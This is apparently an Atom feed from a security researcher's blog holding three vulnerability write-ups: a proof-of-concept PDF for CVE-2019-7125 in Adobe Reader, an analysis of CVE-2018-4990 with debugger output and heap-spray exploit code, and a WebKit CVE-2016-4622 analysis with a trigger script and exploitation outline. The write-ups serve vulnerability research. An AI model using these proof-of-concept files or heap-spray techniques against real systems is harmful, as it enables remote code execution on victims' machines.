<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>o0xmuhe&#39;s blog</title>
  <subtitle>寻找大师，追随大师，成为大师，超越大师</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://o0xmuhe.me/"/>
  <updated>2019-04-12T03:16:54.441Z</updated>
  <id>http://o0xmuhe.me/</id>
  
  <author>
    <name>muhe</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2019-7125 PoC</title>
    <link href="http://o0xmuhe.me/2019/04/12/CVE-2019-7125-PoC/"/>
    <id>http://o0xmuhe.me/2019/04/12/CVE-2019-7125-PoC/</id>
    <published>2019-04-12T03:09:58.000Z</published>
    <updated>2019-04-12T03:16:54.441Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>From Talos :<br><code>Adobe Acrobat Reader DC text field value remote code execution vulnerability — redux</code></p>
<a id="more"></a>
<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">%PDF-1.5</span><br><span class="line"></span><br><span class="line">1 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">/Kids</span><br><span class="line">  [&lt;&lt;</span><br><span class="line">  /Annots</span><br><span class="line">    [&lt;&lt;</span><br><span class="line">    /Subtype /Text</span><br><span class="line">    /Rect[0 0 0 0]</span><br><span class="line">    /Subj (Hello World!)</span><br><span class="line">    &gt;&gt;</span><br><span class="line">    &lt;&lt;</span><br><span class="line">    /Subtype /Text</span><br><span class="line">    /Rect[0 0 0 0]</span><br><span class="line">    /Subj (Hello zzzWorld!)</span><br><span class="line">    &gt;&gt;]</span><br><span class="line">  /Parent 1 0 R</span><br><span class="line">  /Contents[3 0 R]</span><br><span class="line">  &gt;&gt;]</span><br><span class="line">  /Resources&lt;&lt;&gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">%endobj</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3 0 obj&lt;&lt;&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">BT/F1 105 Tf 0 400 Td(Adobe Reader)Tj ET</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">trailer</span><br><span class="line">&lt;&lt;</span><br><span class="line">/Root</span><br><span class="line">  &lt;&lt;</span><br><span class="line">  /AcroForm</span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Fields</span><br><span class="line">      [</span><br><span class="line">      &lt;&lt;</span><br><span class="line">        /Rect[10 10 10 10]</span><br><span class="line">        /Subtype/Widget</span><br><span class="line">        /T(mytext)</span><br><span class="line">        /V(this is a text)</span><br><span class="line">        /FT/Tx</span><br><span class="line">      &gt;&gt;</span><br><span class="line">      ]</span><br><span class="line">  &gt;&gt;</span><br><span class="line">  /OpenAction</span><br><span class="line">    &lt;&lt;</span><br><span class="line">    /S /JavaScript</span><br><span class="line">    /JS(</span><br><span class="line">        var r = new RegExp(Array(32770).join(String.fromCharCode(24)));</span><br><span class="line">        this.getField(&apos;mytext&apos;)[&apos;value&apos;] = r;</span><br><span class="line">44)</span><br><span class="line">    &gt;&gt;</span><br><span class="line">  /Pages 1 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.talosintelligence.com/vulnerability_reports/TALOS-2019-0774" target="_blank" rel="noopener">TALOS-2019-0774</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Info&quot;&gt;&lt;a href=&quot;#Info&quot; class=&quot;headerlink&quot; title=&quot;Info&quot;&gt;&lt;/a&gt;Info&lt;/h2&gt;&lt;p&gt;From Talos :&lt;br&gt;&lt;code&gt;Adobe Acrobat Reader DC text field value remote code execution vulnerability — redux&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Adobe Reader" scheme="http://o0xmuhe.me/tags/Adobe-Reader/"/>
    
      <category term="PoC" scheme="http://o0xmuhe.me/tags/PoC/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-4990 analysis</title>
    <link href="http://o0xmuhe.me/2019/04/06/CVE-2018-4990-analysis/"/>
    <id>http://o0xmuhe.me/2019/04/06/CVE-2018-4990-analysis/</id>
    <published>2019-04-06T13:39:01.000Z</published>
    <updated>2019-04-06T13:54:22.054Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jp2k的越界读，转换2-free的利用。</span><br></pre></td></tr></table></figure>
<h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><p>Win7 x86<br>Adobe Acrobat Reader 2018.011.20036</p>
<a id="more"></a>
<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>一张特殊构造过的JP2K图片<br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/cve-2018-4990-analysis/15542914054830.jpg" alt="-w650"></p>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/cve-2018-4990-analysis/15542914250745.jpg" alt="-w640"></p>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/cve-2018-4990-analysis/15542914374768.jpg" alt="-w641"></p>
<p>大小和内容都是经过构造的，这里先触发一下漏洞，分析漏洞成因。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>打开pageheap后，windbg调试。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; r</span><br><span class="line">eax=00000000 ebx=00000000 ecx=6bf58598 edx=00000000 esi=00000000 edi=00000000</span><br><span class="line">eip=6bf2ba58 esp=00529b04 ebp=00529b20 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">verifier!VerifierStopMessage+0x1f8:</span><br><span class="line">6bf2ba58 cc              int     3</span><br><span class="line">0:000&gt; k10</span><br><span class="line">ChildEBP RetAddr  </span><br><span class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</span><br><span class="line">00529b20 6bf29ee0 verifier!VerifierStopMessage+0x1f8</span><br><span class="line">00529b84 6bf26f11 verifier!VerifierDisableFaultInjectionExclusionRange+0x3f90</span><br><span class="line">0052a16c 6bf26f95 verifier!VerifierDisableFaultInjectionExclusionRange+0xfc1</span><br><span class="line">0052a190 6bf27240 verifier!VerifierDisableFaultInjectionExclusionRange+0x1045</span><br><span class="line">0052a1ac 6bf29080 verifier!VerifierDisableFaultInjectionExclusionRange+0x12f0</span><br><span class="line">0052a1c8 776b65f4 verifier!VerifierDisableFaultInjectionExclusionRange+0x3130</span><br><span class="line">0052a210 7767a0aa ntdll!RtlpNtMakeTemporaryKey+0x48b5</span><br><span class="line">0052a304 776465a6 ntdll!EtwSetMark+0xe743</span><br><span class="line">0052a324 7733c3d4 ntdll!wcsnicmp+0xcaa</span><br><span class="line">0052a338 69feecfa kernel32!HeapFree+0x14</span><br><span class="line">0052a34c 64290574 MSVCR120!free+0x1a</span><br><span class="line">0052a46c 642a6482 JP2KLib!JP2KCopyRect+0xbae6</span><br><span class="line">0052a4c4 65f06a24 JP2KLib!JP2KImageInitDecoderEx+0x24</span><br><span class="line">0052a54c 65f083be AcroRd32_65910000!AX_PDXlateToHostEx+0x2615e5</span><br><span class="line">0052a5ac 65efd459 AcroRd32_65910000!AX_PDXlateToHostEx+0x262f7f</span><br><span class="line">0052a5b8 65f06368 AcroRd32_65910000!AX_PDXlateToHostEx+0x25801a</span><br></pre></td></tr></table></figure>
<p>根据call stack往前找，找漏洞触发的点，着重分析JP2KLib中两个调用。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">JP2KImageInitDecoderEx</span><span class="params">(Concurrency::details::SchedulerBase *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_1004F3BD(a2, a3, a4, a5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/cve-2018-4990-analysis/15543015735567.jpg" alt="-w848"></p>
<p>对应的汇编<br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/cve-2018-4990-analysis/15543020367641.jpg" alt="-w375"></p>
<p>调试一下这里：<br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/cve-2018-4990-analysis/15543023168418.jpg" alt="-w1485"></p>
<p>可以发现，这个循环，每次读取8字节，循环次数<code>0xff</code>次。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> idx = <span class="number">0</span>; idx &lt; <span class="number">0xff</span>; idx++)&#123;</span><br><span class="line">    <span class="comment">//do read work...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后一次循环的时候，idx是<code>0xfe</code>，此时读取到 <code>0xfe * 4</code>。<br>调试发现，<br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/cve-2018-4990-analysis/15543026333699.jpg" alt="-w426"></p>
<p>这个buffer size只有<code>0xfd * 4 = 0x3f4</code>这么大，所以导致越界读的发生。</p>
<h2 id="Exploit-分析"><a href="#Exploit-分析" class="headerlink" title="Exploit 分析"></a>Exploit 分析</h2><p>这个利用可以说十分的巧妙，利用js布局内存，把越界读转换成了<code>Double free</code>完成利用。</p>
<p><a href="https://github.com/o0xmuhe/RealWorldPwn/tree/master/CVE-2018-4990" target="_blank" rel="noopener">完整Exploit链接</a></p>
<p>因为需要提前做内存布局，不能直接就触发漏洞，所以需要利用js再布局内存完成后，主动地触发漏洞，这里的做法和p2o 2017，360安全团队打Reader的利用套路一样，把图片放嵌入<code>button field</code>,并设置按钮不可显示，在布局完成后，设置按钮属性可显，然后触发漏洞。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a         = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x3000</span>);</span><br><span class="line"><span class="keyword">var</span> spraynum  = <span class="number">0x1000</span>;</span><br><span class="line"><span class="keyword">var</span> sprayarr  = <span class="keyword">new</span> <span class="built_in">Array</span>(spraynum);</span><br><span class="line"><span class="keyword">var</span> spraylen  = <span class="number">0x10000</span><span class="number">-24</span>;</span><br><span class="line"><span class="keyword">var</span> spraybase = <span class="number">0x0d0e0048</span>;</span><br><span class="line"><span class="keyword">var</span> spraypos  = <span class="number">0x0d0f0058</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// force allocations to prepare the heap for the oob read</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i1 = <span class="number">1</span>; i1 &lt; <span class="number">0x3000</span>; i1++)&#123;</span><br><span class="line">    a[i1] = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="number">252</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// these will be freed</span></span><br><span class="line">    a[i1][<span class="number">249</span>] = spraybase;</span><br><span class="line">    a[i1][<span class="number">250</span>] = spraybase + <span class="number">0x10000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// heap spray to land ArrayBuffers at 0x0d0e0048 and 0x0d0f0048</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i1 = <span class="number">1</span>; i1 &lt; spraynum; i1++)&#123;</span><br><span class="line">    sprayarr[i1] = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(spraylen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// make holes so the oob read chunk lands here</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i1 = <span class="number">1</span>; i1 &lt; <span class="number">0x3000</span>; i1 = i1 + <span class="number">2</span>)&#123;</span><br><span class="line">    <span class="keyword">delete</span> a[i1];</span><br><span class="line">    a[i1] = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>内存布局的话，利用中使用了ArrayBuffer，利用堆喷，分配大量连续的Arraybuffer，并<code>make hole</code>，使得图片解析的时候正好分配到内存布局的<code>hole</code>;随后触发越界读，把漏洞转换成double free去利用。</p>
<p>​    利用的后面通过sprayarr2的赋值抢占释放的0x20000内存，一旦抢占成功，sprayarr中之前被释放的elment的长度就会被修改为0x20000；最后通过之前内存布局后精准的内存释放(idx 249,250)获取一个超长element，以实现全局内存读写，再通过全局内存读写，伪造bookmarkRoot的对象实现任意代码执行。</p>
<h2 id="遇到的问题-TODO"><a href="#遇到的问题-TODO" class="headerlink" title="遇到的问题(TODO)"></a>遇到的问题(TODO)</h2><p>win7上这些分析没啥问题，一步步调试，内存布局也没什么问题；在win10上内存布局出现了不连续、失效等情况，这部分<code>TODO</code>，需要解决。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://srcincite.io/blog/2018/05/21/adobe-me-and-a-double-free.html" target="_blank" rel="noopener">adobe-me-and-a-double-free</a></p>
<p><a href="https://bbs.pediy.com/thread-250449.htm" target="_blank" rel="noopener">对CVE-2018-4990漏洞的补充分析</a></p>
<p><a href="https://ti.360.net/blog/articles/analysis-of-cve-2018-4990/" target="_blank" rel="noopener"><strong>CVE-2018-4990 Adobe Reader 代码执行漏洞利用分析</strong></a></p>
]]></content>
    
    <summary type="html">
    
      &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;jp2k的越界读，转换2-free的利用。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;环境信息&quot;&gt;&lt;a href=&quot;#环境信息&quot; class=&quot;headerlink&quot; title=&quot;环境信息&quot;&gt;&lt;/a&gt;环境信息&lt;/h2&gt;&lt;p&gt;Win7 x86&lt;br&gt;Adobe Acrobat Reader 2018.011.20036&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞分析" scheme="http://o0xmuhe.me/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Adobe Acrobat Reader" scheme="http://o0xmuhe.me/tags/Adobe-Acrobat-Reader/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2016-4622  analysis</title>
    <link href="http://o0xmuhe.me/2019/04/06/CVE-2016-4622-analysis/"/>
    <id>http://o0xmuhe.me/2019/04/06/CVE-2016-4622-analysis/</id>
    <published>2019-04-06T13:14:28.000Z</published>
    <updated>2019-04-06T13:31:14.446Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-Vuln-info"><a href="#0x00-Vuln-info" class="headerlink" title="0x00 : Vuln info"></a>0x00 : Vuln info</h2><p>Vuln : <code>Out-Of-Bound Read</code><br>Webkit Version : <code>320b1fc</code><br>Source Code : <code>ArrayPrototype.cpp</code>  的slice部分逻辑</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b CVE-2016-4662 320b1<span class="built_in">fc</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="0x01-PoC"><a href="#0x01-PoC" class="headerlink" title="0x01 : PoC"></a>0x01 : PoC</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">    a.push(i + <span class="number">0.123</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = a.slice(<span class="number">0</span>, &#123;<span class="attr">valueOf</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; a.length = <span class="number">0</span>; <span class="keyword">return</span> <span class="number">10</span>; &#125;&#125;);</span><br><span class="line"><span class="comment">// b = [0.123,1.123,2.12199579146e-313,0,0,0,0,0,0,0]</span></span><br></pre></td></tr></table></figure>
<h2 id="0x02-Analysis"><a href="#0x02-Analysis" class="headerlink" title="0x02 : Analysis"></a>0x02 : Analysis</h2><h3 id="PoC-分析"><a href="#PoC-分析" class="headerlink" title="PoC 分析"></a>PoC 分析</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">    a.push(i + <span class="number">0.123</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = a.slice(<span class="number">0</span>, &#123;<span class="attr">valueOf</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; a.length = <span class="number">0</span>; <span class="keyword">return</span> <span class="number">10</span>; &#125;&#125;);</span><br><span class="line"><span class="comment">// b = [0.123,1.123,2.12199579146e-313,0,0,0,0,0,0,0]</span></span><br></pre></td></tr></table></figure>
<p>原本想要做的是：从<code>a array</code>中取前十个元素，放入<code>b array</code>中。</p>
<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p><code>slice</code>对应分片操作，这里<code>b数组</code>的值是取的<code>a数组</code>的前十个元素，但是这里取的时候，<code>valueOf</code>这个回调修改掉了<code>a数组</code>的长度；然而，在发生拷贝操作的时候，<code>slice</code>的实现函数并没有检查长度，就直接拷贝了数据，这就导致<code>b数组</code>取的时候访问到了<code>a数组</code>以外的内存，所以可以看到<code>b数组</code>的内容是：<code>[0.123,1.123,2.12199579146e-313,0,0,0,0,0,0,0]</code><br>从<code>0.123</code>之后都是其他数据，此时已经发生了越界读。</p>
<p><code>root cause</code> : 拷贝前未做长度检查</p>
<p>未patch的代码如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">EncodedJSValue JSC_HOST_CALL <span class="title">arrayProtoFuncSlice</span><span class="params">(ExecState* exec)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    JSObject* thisObj = exec-&gt;thisValue()</span><br><span class="line">    .toThis(exec, StrictMode)</span><br><span class="line">    .toObject(exec);</span><br><span class="line">    <span class="keyword">if</span> (!thisObj)</span><br><span class="line">        <span class="keyword">return</span> JSValue::encode(JSValue());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> length = getLength(exec, thisObj);</span><br><span class="line">    <span class="keyword">if</span> (exec-&gt;hadException())</span><br><span class="line">        <span class="keyword">return</span> JSValue::encode(jsUndefined());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> begin = argumentClampedIndexFromStartOrEnd(exec, <span class="number">0</span>, length);</span><br><span class="line">    <span class="keyword">unsigned</span> end =</span><br><span class="line">    argumentClampedIndexFromStartOrEnd(exec, <span class="number">1</span>, length, length);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::pair&lt;SpeciesConstructResult, JSObject*&gt; speciesResult =</span><br><span class="line">    speciesConstructArray(exec, thisObj, end - begin);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (UNLIKELY(speciesResult.first ==</span><br><span class="line">                 SpeciesConstructResult::Exception))</span><br><span class="line">        <span class="keyword">return</span> JSValue::encode(jsUndefined());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行切片操作，但是没有任何检查</span></span><br><span class="line">    <span class="keyword">if</span> (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath &amp;&amp;</span><br><span class="line">               isJSArray(thisObj))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (JSArray* result =</span><br><span class="line">            asArray(thisObj)-&gt;fastSlice(*exec, begin, end - begin))</span><br><span class="line">            <span class="keyword">return</span> JSValue::encode(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    JSObject* result;</span><br><span class="line">    <span class="keyword">if</span> (speciesResult.first == SpeciesConstructResult::CreatedObject)</span><br><span class="line">        result = speciesResult.second;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        result = constructEmptyArray(exec, <span class="literal">nullptr</span>, end - begin);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">unsigned</span> k = begin; k &lt; end; k++, n++) &#123;</span><br><span class="line">        JSValue v = getProperty(exec, thisObj, k);</span><br><span class="line">        <span class="keyword">if</span> (exec-&gt;hadException())</span><br><span class="line">            <span class="keyword">return</span> JSValue::encode(jsUndefined());</span><br><span class="line">        <span class="keyword">if</span> (v)</span><br><span class="line">            result-&gt;putDirectIndex(exec, n, v);</span><br><span class="line">    &#125;</span><br><span class="line">    setLength(exec, result, n);</span><br><span class="line">    <span class="keyword">return</span> JSValue::encode(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="0x03-Exploit"><a href="#0x03-Exploit" class="headerlink" title="0x03 : Exploit"></a>0x03 : Exploit</h2><p>这里不再赘述，原文作者写的很详细，我也是跟着他的文章调试学习的。 </p>
<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><ol>
<li>信息泄漏</li>
<li>伪造对象(Fload64Array)</li>
<li>任意地址读写</li>
<li>读取一个function obj的地址，触发JIT生成RWX的代码</li>
<li>利用任意地址读写写入shellcode</li>
<li>执行function</li>
</ol>
<h2 id="0x04-后续"><a href="#0x04-后续" class="headerlink" title="0x04: 后续"></a>0x04: 后续</h2><h3 id="1-how-to-find-this-bug？"><a href="#1-how-to-find-this-bug？" class="headerlink" title="1. how to find this bug？"></a>1. how to find this bug？</h3><p>​    代码审计就不说了，主要是关注在一些敏感函数前后的check情况，比如复制操作，拼接操作等。</p>
<p>​        Fuzz的话，生成式和变异式都很容易覆盖到这个case，并没有很难，只是这个洞是一种模式的问题，所以在写fuzz的规则或者模版的时候要多注意。所以在看洞的时候要思考，这是一个模式的问题，还是个例。</p>
<h3 id="2-其他类似的bug"><a href="#2-其他类似的bug" class="headerlink" title="2. 其他类似的bug"></a>2. 其他类似的bug</h3><p>​    runtime中利用slide-effect来修改一些对象类型、长度等信息，来触发一些类型混淆、越界的情况很多，不仅仅在jsc引擎，但是这些基本已经成为历史了。 这种类型的漏洞，在2016年keen lab 在poc的议题中提到了很多，其中也有类似4622这个洞的一些其他漏洞。</p>
<h3 id="3-关于调试这个洞"><a href="#3-关于调试这个洞" class="headerlink" title="3. 关于调试这个洞"></a>3. 关于调试这个洞</h3><p>新版本的macos上编译有点麻烦，需要老版sdk，不想折腾的，直接装老版本的macOS虚拟机就行，这是最简单的办法；如果你选择自己编译，慢慢修错误吧。。问题太多了。</p>
<p>如果调洞，Linux也可以，直接<code>build-jsc-only</code>就好了。</p>
<p>lldb调试的话，推荐Voltron插件，同时推荐我写的<a href="https://github.com/o0xmuhe/RockLeePrj/blob/master/Tools/voltron_debug.sh" target="_blank" rel="noopener">tmux脚本</a>。</p>
<h2 id="0x05-引用"><a href="#0x05-引用" class="headerlink" title="0x05:引用"></a>0x05:引用</h2><p><a href="https://paper.seebug.org/207/" target="_blank" rel="noopener">攻击JavaScript引擎：一个JavaScriptCore的学习案例(CVE-2016-4622 (2016-10-27))</a></p>
<p><a href="http://www.phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="noopener">attacking_javascript_engines</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-Vuln-info&quot;&gt;&lt;a href=&quot;#0x00-Vuln-info&quot; class=&quot;headerlink&quot; title=&quot;0x00 : Vuln info&quot;&gt;&lt;/a&gt;0x00 : Vuln info&lt;/h2&gt;&lt;p&gt;Vuln : &lt;code&gt;Out-Of-Bound Read&lt;/code&gt;&lt;br&gt;Webkit Version : &lt;code&gt;320b1fc&lt;/code&gt;&lt;br&gt;Source Code : &lt;code&gt;ArrayPrototype.cpp&lt;/code&gt;  的slice部分逻辑&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git checkout -b CVE-2016-4662 320b1&lt;span class=&quot;built_in&quot;&gt;fc&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="漏洞分析" scheme="http://o0xmuhe.me/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="webkit" scheme="http://o0xmuhe.me/tags/webkit/"/>
    
  </entry>
  
  <entry>
